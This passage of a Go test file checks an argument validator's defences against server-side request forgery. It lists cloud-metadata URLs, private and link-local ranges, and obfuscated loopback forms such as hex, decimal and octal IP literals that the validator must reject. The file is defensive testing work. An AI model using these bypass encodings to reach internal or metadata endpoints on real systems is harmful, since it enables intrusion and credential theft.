		"http://172.16.0.1/",
		"http://100.64.0.1/",
		"http://0.0.0.0/",
		"http://[::ffff:127.0.0.1]/",
		"http://[fc00::1]/",
		"http://[2001:db8::1]/",
	} {
		if _, err := ValidateArg(blocking, v); err == nil {
			t.Errorf("%q: block_internal must reject", v)
		}
	}
	if _, err := ValidateArg(blocking, "https://93.184.216.34/x"); err != nil {
		t.Errorf("public literal under block_internal must pass: %v", err)
	}
	if _, err := ValidateArg(blocking, "https://example.com/"); err != nil {
		t.Errorf("hostname under block_internal must pass this wave: %v", err)
	}
}

func TestURLIMDSAlwaysBlocked(t *testing.T) {
	for _, blockInternal := range []bool{false, true} {
		def := &manifest.ArgDef{Name: "u", Type: "url", BlockInternal: blockInternal}
		for _, v := range []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.0.1/",
			"http://[::ffff:169.254.169.254]/latest/meta-data/",
			"http://[fe80::1]/",
		} {
			_, err := ValidateArg(def, v)
			if err == nil {
				t.Errorf("block_internal=%v %q: expected rejection", blockInternal, v)
				continue
			}
			// The bracketed forms are caught by the metacharacter blocklist
			// first; the dotted form must carry the always-blocked wording.
			if !strings.Contains(v, "[") && !strings.Contains(err.Error(), "always blocked") {
				t.Errorf("block_internal=%v %q: want always-blocked wording, got %v", blockInternal, v, err)
			}
		}
	}
	want := "validation error for 'u': target is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"
	_, err := ValidateArg(&manifest.ArgDef{Name: "u", Type: "url"}, "http://169.254.169.254/")
	if err == nil || err.Error() != want {
		t.Errorf("want %q, got %v", want, err)
	}
}

func TestURLHostHardening(t *testing.T) {
	def := &manifest.ArgDef{Name: "u", Type: "url"}
	cases := []struct{ value, wantSub string }{
		{"http://0x7f000001/", "non-canonical IP literal"},
		{"http://2130706433/", "non-canonical IP literal"},
		{"http://0177.0.0.1/", "non-canonical IP literal"},
		{"http://127.1/", "non-canonical IP literal"},
		{"http://xn--example-9c.com/", "punycode"},
		{"http://XN--example-9c.com/", "punycode"},
		{"http://user:pw@example.com/", "userinfo"},
		{"http://example.com?x=a@b", "userinfo"},
		{"http:///path", "host must not be empty"},
		{"http://", "host must not be empty"},
		{"http://:8080/", "host must not be empty"},
		{"http://::1/", "not a valid hostname"},
		{"http://example.123/", "not a valid hostname"},
		{"http://exa_mple.com/", "not a valid hostname"},
		{"example.com", "expected scheme://host"},
	}
	for _, c := range cases {
		_, err := ValidateArg(def, c.value)
		if err == nil {
			t.Errorf("%q: expected rejection", c.value)
			continue
		}
		if !strings.Contains(err.Error(), c.wantSub) {
			t.Errorf("%q: error %q does not contain %q", c.value, err.Error(), c.wantSub)
		}
	}
	for _, v := range []string{"http://93.184.216.34/x", "https://example.com/path?q=1#frag", "https://sub.example.com"} {
		if _, err := ValidateArg(def, v); err != nil {
			t.Errorf("%q: unexpected error: %v", v, err)
		}
	}
}

// The public entry point refuses "[" and "]" through the metacharacter
// blocklist before the structural parse runs, so the bracketed-IPv6 path is
// covered directly here.
func TestSplitURLHostPort(t *testing.T) {
	good := []struct{ in, host, port string }{
		{"example.com", "example.com", ""},
		{"example.com:8443", "example.com", "8443"},
		{"93.184.216.34:80", "93.184.216.34", "80"},
		{"[::1]", "::1", ""},
		{"[::1]:8080", "::1", "8080"},
		{"[2001:db8::1]:443", "2001:db8::1", "443"},
		{"[::ffff:169.254.169.254]", "::ffff:169.254.169.254", ""},
	}
	for _, c := range good {
		host, port, err := splitURLHostPort(c.in)
		if err != nil {
			t.Errorf("%q: unexpected error: %v", c.in, err)
			continue
		}
		if host != c.host || port != c.port {
			t.Errorf("%q: got (%q, %q), want (%q, %q)", c.in, host, port, c.host, c.port)
		}
	}
	bad := []string{"", ":8080", "example.com:", "[::1]:", "[::1", "[example.com]", "[::1]x", "[::1]8080", "[fe80::1%eth0]", "[127.0.0.1]"}
	for _, in := range bad {
		if host, port, err := splitURLHostPort(in); err == nil {
			t.Errorf("%q: expected error, got (%q, %q)", in, host, port)
		}
	}
}

func TestScopeTargetBlockInternal(t *testing.T) {
	open := &manifest.ArgDef{Name: "t", Type: "scope_target"}
	blocking := &manifest.ArgDef{Name: "t", Type: "scope_target", BlockInternal: true}

	// Default policy is permissive for loopback/private so tools that
	// legitimately target internal hosts keep working without opt-in.
	for _, v := range []string{"127.0.0.1", "10.0.0.5", "::1", "10.0.0.0/24"} {
		if _, err := ValidateArg(open, v); err != nil {
			t.Errorf("%q without block_internal must pass: %v", v, err)
		}
	}
	// ...but link-local / cloud metadata is blocked unconditionally.
	for _, v := range []string{"169.254.169.254", "169.254.0.1", "::ffff:169.254.169.254", "fe80::1", "169.254.0.0/16", "fe80::/10"} {
		_, err := ValidateArg(open, v)
		if err == nil || !strings.Contains(err.Error(), "always blocked") {
			t.Errorf("%q: want always-blocked rejection, got %v", v, err)
		}
	}

	for _, v := range []string{
		"127.0.0.1",
		"10.0.0.5",
		"192.168.1.1",
		"172.31.255.254",
		"100.64.0.1",
		"169.254.169.254",
		"0.0.0.0",
		"255.255.255.255",
		"192.0.2.1",
		"198.51.100.7",
		"203.0.113.9",
		"198.18.0.1",
		"240.0.0.1",
		"::1",
		"::",
		"fc00::1",
		"fd12::1",
		"fe80::1",
		"2001:db8::1",
		"::ffff:127.0.0.1",
		"::ffff:10.0.0.1",
		"10.0.0.0/24",
		"192.168.0.0/16",
	} {
		if _, err := ValidateArg(blocking, v); err == nil {
			t.Errorf("%q: block_internal must reject", v)
		}
	}
	want := "validation error for 't': target resolves to a private address (blocked by block_internal policy)"
	if _, err := ValidateArg(blocking, "10.0.0.5"); err == nil || err.Error() != want {
		t.Errorf("want %q, got %v", want, err)
	}
	for _, v := range []string{"93.184.216.34", "example.com", "8.8.8.0/24", "2606:4700::1111"} {
		if _, err := ValidateArg(blocking, v); err != nil {
			t.Errorf("%q under block_internal must pass: %v", v, err)
		}
	}
}

func TestScopeTargetRejectsObfuscatedIPLiterals(t *testing.T) {
	// A libc resolver expands all of these to 127.0.0.1 — they must not
	// pass as canonical IPs or sneak through as "hostnames".
	def := &manifest.ArgDef{Name: "t", Type: "scope_target"}
	for _, v := range []string{
		"2130706433", // decimal integer
		"0x7f000001", // hex
		"0X7F000001", // hex, upper case
		"0177.0.0.1", // octal-leading
		"127.1",      // shorthand
		"010.0.0.1",  // leading-zero octet
		"1.2.3",      // three all-numeric labels
	} {
		_, err := ValidateArg(def, v)
		if err == nil {
			t.Errorf("%q: expected rejection", v)
			continue
		}
		if !strings.Contains(err.Error(), "non-canonical IP literal") {
			t.Errorf("%q: want non-canonical wording, got %v", v, err)
		}
	}
	// Other resolver-expandable or structurally invalid shapes.
	for _, v := range []string{"example.123", "127.0.0.1.", "example.com.", "fe80::1%eth0", "::ffff:010.0.0.1"} {
		if _, err := ValidateArg(def, v); err == nil {
			t.Errorf("%q: expected rejection", v)
		}
	}
	// Canonical forms still pass (no block_internal policy here).
	for _, v := range []string{"127.0.0.1", "93.184.216.34", "::1", "::ffff:127.0.0.1", "example.com", "a1.b2.example"} {
		if _, err := ValidateArg(def, v); err != nil {
			t.Errorf("%q: unexpected error: %v", v, err)
		}
	}
}

func TestIPAddressAndCIDRPolicy(t *testing.T) {
	ipOpen := &manifest.ArgDef{Name: "ip", Type: "ip_address"}
	ipBlocking := &manifest.ArgDef{Name: "ip", Type: "ip_address", BlockInternal: true}
	for _, v := range []string{"169.254.169.254", "::ffff:169.254.169.254", "fe80::1"} {
		for _, def := range []*manifest.ArgDef{ipOpen, ipBlocking} {
			_, err := ValidateArg(def, v)
			if err == nil || !strings.Contains(err.Error(), "always blocked") {
				t.Errorf("ip_address %q block_internal=%v: want always-blocked, got %v", v, def.BlockInternal, err)
			}
		}
	}
	if _, err := ValidateArg(ipOpen, "127.0.0.1"); err != nil {
		t.Errorf("ip_address loopback without block_internal must pass: %v", err)
	}
	for _, v := range []string{"127.0.0.1", "10.1.2.3", "::1", "::ffff:10.0.0.1", "fc00::1"} {
		_, err := ValidateArg(ipBlocking, v)
		if err == nil || !strings.Contains(err.Error(), "blocked by block_internal policy") {
			t.Errorf("ip_address %q: want block_internal rejection, got %v", v, err)
		}
	}
	for _, v := range []string{"0x7f000001", "010.0.0.1", "127.1", "2130706433", "fe80::1%eth0", "1.2.3.4/24"} {
		if _, err := ValidateArg(ipOpen, v); err == nil {
			t.Errorf("ip_address %q: expected rejection", v)
		}
	}
	if _, err := ValidateArg(ipBlocking, "93.184.216.34"); err != nil {
		t.Errorf("ip_address public literal must pass: %v", err)
	}

	cidrOpen := &manifest.ArgDef{Name: "c", Type: "cidr"}
	cidrBlocking := &manifest.ArgDef{Name: "c", Type: "cidr", BlockInternal: true}
	for _, v := range []string{"169.254.0.0/16", "169.254.169.0/24", "fe80::/10"} {
		for _, def := range []*manifest.ArgDef{cidrOpen, cidrBlocking} {
			_, err := ValidateArg(def, v)
			if err == nil || !strings.Contains(err.Error(), "always blocked") {
				t.Errorf("cidr %q block_internal=%v: want always-blocked, got %v", v, def.BlockInternal, err)
			}
		}
	}
	if _, err := ValidateArg(cidrOpen, "10.0.0.0/8"); err != nil {
		t.Errorf("cidr private without block_internal must pass: %v", err)
	}
	for _, v := range []string{"10.0.0.0/8", "192.168.1.0/24", "127.0.0.0/8", "2001:db8::/32", "fc00::/7"} {
		_, err := ValidateArg(cidrBlocking, v)
		if err == nil || !strings.Contains(err.Error(), "blocked by block_internal policy") {
			t.Errorf("cidr %q: want block_internal rejection, got %v", v, err)
		}
	}
	for _, v := range []string{"10.0.0.0/33", "010.0.0.0/8", "0x0a000000/8", "10.0.0.0", "10.0.0.0/"} {
		if _, err := ValidateArg(cidrOpen, v); err == nil {
			t.Errorf("cidr %q: expected rejection", v)
		}
	}
	if _, err := ValidateArg(cidrBlocking, "8.8.8.0/24"); err != nil {
		t.Errorf("cidr public range must pass: %v", err)
	}
}

// One representative address per row of the range table, including the
// IPv4-mapped IPv6 forms, checked against the exact reason wording.
func TestHostPolicyRangeTable(t *testing.T) {
	always := []struct{ addr, reason string }{
		{"169.254.169.254", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
		{"169.254.0.1", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
		{"::ffff:169.254.169.254", "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked"},
		{"fe80::1", "is an IPv6 link-local address (fe80::/10) — always blocked"},
		{"febf::1", "is an IPv6 link-local address (fe80::/10) — always blocked"},
	}
	for _, c := range always {
		addr, ok := parseCanonicalIP(c.addr)
		if !ok {
			t.Fatalf("%q did not parse", c.addr)
		}
		if got := alwaysBlockedIPReason(addr); got != c.reason {
			t.Errorf("%q: got %q, want %q", c.addr, got, c.reason)
		}
	}
	for _, v := range []string{"127.0.0.1", "10.0.0.1", "93.184.216.34", "::1", "fc00::1", "fec0::1"} {
		addr, _ := parseCanonicalIP(v)
		if got := alwaysBlockedIPReason(addr); got != "" {
			t.Errorf("%q must not be always-blocked, got %q", v, got)
		}
	}

	nonPublic := []struct{ addr, reason string }{
		{"127.0.0.1", "resolves to a loopback address"},
		{"127.255.255.254", "resolves to a loopback address"},
		{"10.0.0.1", "resolves to a private address"},
		{"172.16.0.1", "resolves to a private address"},
		{"172.31.255.255", "resolves to a private address"},
		{"192.168.0.1", "resolves to a private address"},
		{"100.64.0.1", "is a carrier-grade NAT address (100.64.0.0/10)"},
		{"100.127.255.255", "is a carrier-grade NAT address (100.64.0.0/10)"},
		{"0.0.0.0", "is the unspecified address 0.0.0.0"},
		{"0.1.2.3", "is the unspecified address 0.0.0.0"},
		{"255.255.255.255", "is the broadcast address"},
		{"192.0.2.1", "is a documentation-range address"},
		{"198.51.100.1", "is a documentation-range address"},
		{"203.0.113.1", "is a documentation-range address"},
		{"198.18.0.1", "is a benchmarking-range address (198.18.0.0/15)"},
		{"198.19.255.255", "is a benchmarking-range address (198.18.0.0/15)"},
		{"240.0.0.1", "is a reserved-range address (240.0.0.0/4)"},
		{"255.255.255.254", "is a reserved-range address (240.0.0.0/4)"},
		{"::1", "resolves to the IPv6 loopback ::1"},
		{"::", "is the IPv6 unspecified address ::"},
		{"fc00::1", "is an IPv6 unique-local address (fc00::/7)"},
		{"fdff::1", "is an IPv6 unique-local address (fc00::/7)"},
		{"fe80::1", "is an IPv6 link-local address (fe80::/10)"},
		{"2001:db8::1", "is an IPv6 documentation-range address (2001:db8::/32)"},
		{"::ffff:127.0.0.1", "resolves to a loopback address"},
		{"::ffff:10.0.0.1", "resolves to a private address"},
		{"::ffff:192.168.1.1", "resolves to a private address"},
		{"::ffff:0.0.0.0", "is the unspecified address 0.0.0.0"},
		{"::ffff:255.255.255.255", "is the broadcast address"},
		{"::ffff:192.0.2.1", "is a documentation-range address"},
		{"::ffff:198.18.0.1", "is a benchmarking-range address (198.18.0.0/15)"},
		{"::ffff:240.0.0.1", "is a reserved-range address (240.0.0.0/4)"},
	}
	for _, c := range nonPublic {
		addr, ok := parseCanonicalIP(c.addr)
		if !ok {
			t.Fatalf("%q did not parse", c.addr)
		}
		if got := nonPublicIPReason(addr); got != c.reason {
			t.Errorf("%q: got %q, want %q", c.addr, got, c.reason)
		}
	}
	for _, v := range []string{
		"93.184.216.34", "8.8.8.8", "1.1.1.1", "100.63.255.255", "100.128.0.0",
		"172.15.255.255", "172.32.0.0", "198.17.255.255", "198.20.0.0", "223.255.255.255",
		"2606:4700::1111", "2001:db7::1", "2001:db9::1", "fbff::1", "fec0::1", "::ffff:8.8.8.8",
	} {
		addr, ok := parseCanonicalIP(v)
		if !ok {
			t.Fatalf("%q did not parse", v)
		}
		if got := nonPublicIPReason(addr); got != "" {
			t.Errorf("%q must be public, got %q", v, got)
		}
	}
}

func TestCanonicalIPHelpers(t *testing.T) {
	for _, v := range []string{"127.0.0.1", "::1", "::ffff:1.2.3.4", "2001:db8::1", "255.255.255.255"} {
		if _, ok := parseCanonicalIP(v); !ok {
			t.Errorf("parseCanonicalIP(%q) must succeed", v)
		}
	}
	for _, v := range []string{"", "127.1", "010.0.0.1", "0x7f000001", "2130706433", "fe80::1%eth0", "1.2.3.4.5", "256.0.0.1", "example.com"} {
		if _, ok := parseCanonicalIP(v); ok {
			t.Errorf("parseCanonicalIP(%q) must fail", v)
		}
	}
	for _, v := range []string{"2130706433", "0x7f000001", "0Xff", "0177.0.0.1", "127.1", "010.0.0.1", "1.2.3", "0"} {
		if !looksLikeIPLiteral(v) {
			t.Errorf("looksLikeIPLiteral(%q) must be true", v)
		}
	}
	for _, v := range []string{"", "example.com", "1.2.3.example", "a.1", "1..2", ".1", "1.", "::1"} {
		if looksLikeIPLiteral(v) {
			t.Errorf("looksLikeIPLiteral(%q) must be false", v)
		}
	}
	for _, v := range []string{"example.com", "a.b1", "localhost", "x"} {
		if !tldNotAllNumeric(v) {
			t.Errorf("tldNotAllNumeric(%q) must be true", v)
		}
	}
	for _, v := range []string{"example.123", "1.2.3.4", "example.com.", "", "7"} {
		if tldNotAllNumeric(v) {
			t.Errorf("tldNotAllNumeric(%q) must be false", v)
		}
	}
}
